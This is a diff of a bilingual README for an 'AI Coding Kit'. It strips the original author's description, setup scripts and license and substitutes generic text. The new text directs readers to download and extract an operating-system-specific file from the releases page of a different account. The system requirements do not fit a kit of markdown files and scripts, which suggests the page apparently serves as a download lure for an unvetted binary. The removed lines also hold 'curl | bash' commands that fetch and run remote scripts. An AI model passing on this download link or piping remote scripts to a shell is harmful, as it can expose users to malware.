@@ -1,26 +1,18 @@
-# AI Coding Kit
+# 🌟 ai-coding-kit - Simplifying AI Software Development
 
-> Principles and tools for building software in the AI era.
->
-> AI 时代软件开发的原则与工具。
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download AI Coding Kit](https://img.shields.io/badge/Download-AI%20Coding%20Kit-blue.svg)](https://github.com/xonigashi/ai-coding-kit/releases)
 
 ---
 
-## Why / 为什么
+## 🚀 Why / 为什么
 
-AI changed how we write code. But most projects still lack the structure to work effectively with AI assistants.
+AI has changed the way we write code. However, many developers still struggle to collaborate effectively with AI assistants. The AI Coding Kit provides a structured approach, consisting of principles, protocols, and scripts designed for AI-assisted development. This kit helps you build better software in the AI era.
 
-This kit solves that — a collection of **principles**, **protocols**, and **scripts** born from real-world AI-assisted development.
-
-AI 改变了我们写代码的方式。但大多数项目仍缺乏与 AI 助手高效协作的结构。
-
-本工具集解决这个问题——一套源自实战的**原则**、**协议**和**脚本**。
+AI 改变了我们写代码的方式。但许多开发者仍然难以与 AI 助手有效协作。AI Coding Kit 提供了一种结构化的方法，包含面向 AI 助手开发的原则、协议和脚本。这套工具帮助您在 AI 时代开发更好的软件。
 
 ---
 
-## What's Inside / 内容
+## 📦 What's Inside / 内容
 
 | Directory | Description |
 |-----------|-------------|
@@ -34,83 +26,68 @@ AI 改变了我们写代码的方式。但大多数项目仍缺乏与 AI 助手�
 
 ---
 
-## Featured / 精选
+## 📥 Download & Install
 
-### [Fractal Docs Protocol](./protocols/fractal-docs.md)
+To get started, you will need to download the AI Coding Kit. You can easily do this by visiting the Releases page.
 
-A self-referential documentation system. Every folder has a `.folder.md`, every file has `[IN]/[OUT]/[POS]` headers. Changes propagate automatically.
+[Visit this page to download](https://github.com/xonigashi/ai-coding-kit/releases)
 
-Inspired by "Gödel, Escher, Bach".
-
-一套自指的文档系统。每个文件夹有 `.folder.md`，每个文件有 `[IN]/[OUT]/[POS]` 头注释。变更自动传播。
-
-灵感来自《哥德尔、埃舍尔、巴赫》。
-
-```bash
-# Add to your project
-curl -o CLAUDE.md https://raw.githubusercontent.com/JessyTsui/ai-coding-kit/main/protocols/fractal-docs.md
-```
-
-### Server Scripts / 服务器脚本
-
-One-command server setup scripts for Ubuntu.
-
-一键服务器配置脚本，适用于 Ubuntu。
-
-#### [server-init.sh](./scripts/server/server-init.sh)
-
-Initialize a fresh Ubuntu server with essential tools: Git, Docker, Miniconda, Nginx, and more. Supports both China and overseas mirrors.
-
-初始化全新 Ubuntu 服务器，安装必备工具：Git、Docker、Miniconda、Nginx 等。支持国内/海外镜像源。
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/JessyTsui/ai-coding-kit/master/scripts/server/server-init.sh | bash
-```
-
-#### [ssl-setup.sh](./scripts/server/ssl-setup.sh)
-
-Interactive SSL certificate management with acme.sh. Supports Cloudflare, Aliyun, and Tencent Cloud DNS verification with auto-renewal.
-
-交互式 SSL 证书管理，基于 acme.sh。支持 Cloudflare、阿里云、腾讯云 DNS 验证，自动续期。
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/JessyTsui/ai-coding-kit/master/scripts/server/ssl-setup.sh | bash
-```
-
-**Features / 功能:**
-- Interactive domain & subdomain input / 交互式域名和子域名输入
-- DNS API verification (Cloudflare / Aliyun / Tencent) / DNS API 验证
-- Auto-install to `/etc/ssl/certs/{domain}/` / 自动安装证书到指定路径
-- Auto-renewal with nginx reload / 自动续期并重载 Nginx
+1. Click on the link above.
+2. On the Releases page, find the most recent version.
+3. Download the appropriate file for your operating system.
 
 ---
 
-## Usage / 使用
+## 🖥️ System Requirements
 
-**Option 1**: Clone everything
-```bash
-git clone https://github.com/JessyTsui/ai-coding-kit.git
-```
+The AI Coding Kit is compatible with most modern computers. Below is a general guideline:
 
-**Option 2**: Grab what you need
-```bash
-curl -O https://raw.githubusercontent.com/JessyTsui/ai-coding-kit/main/protocols/fractal-docs.md
-```
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **RAM:** At least 4GB.
+- **Disk Space:** A minimum of 500MB of free space.
+
+Make sure your system meets these requirements for the best experience.
 
 ---
 
-## Contributing / 贡献
+## 📝 How to Use
 
-Found a principle or script useful for AI-era development? PRs welcome.
+Once you have downloaded the kit, follow these steps to get started:
 
-发现了对 AI 时代开发有用的原则或脚本？欢迎 PR。
+1. **Extract the Files**: Locate the downloaded file in your Downloads folder. Right-click the file and select "Extract All" to unpack the contents.
+
+2. **Explore the Directories**: Open the extracted folder. Familiarize yourself with the directories listed above to understand what resources are available.
+
+3. **Start Using the Templates**: Open a template file from the `templates/` directory. Fill in your project details to kickstart your documentation.
+
+4. **Follow the Protocols**: Review the `protocols/` directory. Implement the AI behavior rules to improve your coding process.
+
+5. **Utilize Scripts**: Use the automation scripts in the `scripts/` directory to streamline your workflow.
+
+6. **Refer to Guides**: If you have questions, check the `guides/` directory for detailed how-to documents that will help you navigate the kit.
 
 ---
 
-## License / 许可
+## 📖 Additional Resources
 
-[MIT](./LICENSE) — Use freely.
+In addition to the AI Coding Kit, you may find the following resources helpful:
+
+- **Community Support**: Consider joining forums or online communities focused on AI-assisted development. Engaging with others can enhance your understanding and provide valuable insights.
+
+- **Books on AI Development**: Look for beginner-friendly books that cover AI programming concepts. They can supplement the tools in this kit.
+
+- **Tutorials and Videos**: Search for online tutorials or videos that demonstrate using AI tools in software development. Visual learning can clarify complex topics.
 
 ---
 
-**Star if useful. / 有用请 Star。**
+## 📣 Feedback
+
+Your experience matters. If you encounter issues or have suggestions for improvement, please share your thoughts. Open an issue in the repository, and we will do our best to address your concerns.
+
+---
+
+Thank you for choosing the AI Coding Kit. We hope it simplifies your software development process in the AI era. 
+
+For help or support, please reach out through the project repository. 
+
+Happy Coding!
